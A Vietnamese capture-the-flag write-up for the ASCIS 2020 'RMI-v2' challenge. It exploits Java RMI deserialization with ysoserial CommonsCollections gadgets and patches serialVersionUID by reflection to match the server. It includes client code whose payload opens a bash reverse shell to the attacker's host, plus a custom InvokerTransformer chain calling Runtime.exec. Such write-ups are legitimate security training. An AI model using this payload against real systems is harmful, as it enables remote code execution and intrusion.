# Step 1:
Dựa vào hint của tác giả với blog <a href="https://mogwailabs.de/en/blog/2019/03/attacking-java-rmi-services-after-jep-290/">này</a> có thể sử dụng gadget CommonsCollections6 để khai thác. Chỉnh sửa lại client lại 1 chút để gửi payload.

```
public static void main(String[] args) throws Exception {
        String serverIP = "IP";
        int serverPort = Integer.parseInt("PORT");
        Registry registry = LocateRegistry.getRegistry(serverIP, serverPort);
        ASCISInterf ascisInterf = (ASCISInterf)registry.lookup("ascis");
        Object payload = new CommonsCollections6().getObject("bash -c {echo,BASE64(bash -i >& /dev/tcp/IP/PORT 0>&1)}|{base64,-d}|{bash,-i}");
        System.out.println(ascisInterf.login(payload));
    }
```
Nhận được exception như dưới:
<img src="https://raw.githubusercontent.com/trungthiennguyen/CTF-Writeup/main/ASCIS-2020-Quals/RMI-v2/vul1.png">
Dựa vào đây biết được tác giả đã đổi biến static final serialVersionUID thành -1333713373713373737L.
# Step 2:
Sử dụng java reflection để thay đổi biến static final lại thành -1333713373713373737L là xong.
<img src="https://raw.githubusercontent.com/trungthiennguyen/CTF-Writeup/main/ASCIS-2020-Quals/RMI-v2/image_2020-11-02_17-29-08.png">
# Note:
Sau khi bruteforce class của ysoserial thì còn có thể sử dụng CommonsCollections5
# Explaint
* Dự vào writeup bài 1 của <a href="https://github.com/vinhjaxt/CTF-writeups/issues/2">Vịnh</a> thì ta biết được để làm cách 2 trước tiên phải bruteforce class lấy trong ysoserial. Để bruteforce thì ta sẽ sử dụng GadgetProbe để tìm các classpath có tồn tại trên server, nếu không có sẽ đẩy ra ClassNotFoundException và không có DNS request, nếu có sẽ có DNS trả về.
* Lần lượt bỏ các classpath của từng gadget vào, mình và một người anh cựu sinh viên chung trường - Mr.S tìm được có 3 gadget trong ysoserial có đủ tất cả các classpath trả DNS về là URLDNS, CommonsCollections5, CommonsCollections6. Bọn mình chỉ fuzz tới đây đã thấy có đủ điều kiện để exploit rồi nên không fuzz tiếp mà bỏ gadget vào chạy luôn.
* Sau khi bỏ gadget vào client và gửi cho server như trên, thì bọn mình thu được InvalidClassExeption như hình trên. Trong Exeption có ghi 2 serialVersionUID của class InvokerTransformer, và khi kiểm tra thì biến static final serialVersionUID -86533...688 đó nằm trong class InvokerTransformer của mình. Từ đó mình khá chắc là serialVersionUID -1337... còn lại là nằm trên server. Việc của mình chỉ cần thay đổi biến này thành UID như trên server là xong.
* Để thay đổi giá trị của biến final, bọn mình sử dụng java reflection dựa trên một <a href="https://viblo.asia/p/java-va-nhung-dieu-thu-vi-co-the-ban-chua-biet-LzD5dJeOZjY">đường dẫn</a>, có tiếng việt luôn nên mọi chuyện cực kì dễ dàng.
* Do trình còi nên bọn mình custom lởm chởm gadget như sau:
```
	InvokerTransformer in1 = new InvokerTransformer("getMethod", new Class[] {
            String.class, Class[].class }, new Object[] {
            "getRuntime", new Class[0] });
        Field fieldA = in1.getClass().getDeclaredField("serialVersionUID");
        fieldA.setAccessible(true);
        Field modifiersField = Field.class.getDeclaredField("modifiers");
        modifiersField.setAccessible(true);
        modifiersField.setInt(fieldA, fieldA.getModifiers()&~Modifier.FINAL);
        fieldA.set(in1,-1333713373713373737L);

        InvokerTransformer in2 = new InvokerTransformer("invoke", new Class[] {
            Object.class, Object[].class }, new Object[] {
            null, new Object[0] });
        Field fieldB = in2.getClass().getDeclaredField("serialVersionUID");
        fieldB.setAccessible(true);
        Field modifiersFieldB = Field.class.getDeclaredField("modifiers");
        modifiersFieldB.setAccessible(true);
        modifiersFieldB.setInt(fieldB, fieldB.getModifiers()&~Modifier.FINAL);
        fieldB.set(in2,-1333713373713373737L);

        InvokerTransformer in3 =new InvokerTransformer("exec",
            new Class[] { String.class }, execArgs);
        Field fieldC = in3.getClass().getDeclaredField("serialVersionUID");
        fieldC.setAccessible(true);
        Field modifiersFieldC = Field.class.getDeclaredField("modifiers");
        modifiersFieldC.setAccessible(true);
        modifiersFieldC.setInt(fieldC, fieldC.getModifiers()&~Modifier.FINAL);
        fieldC.set(in3,-1333713373713373737L);

        final Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(Runtime.class),
            in1,
            in2,
            in3,
            new ConstantTransformer(1) };
```
* Xong gadget, sửa lại client như trên rồi gửi lên server để reverse shell về máy là xong.
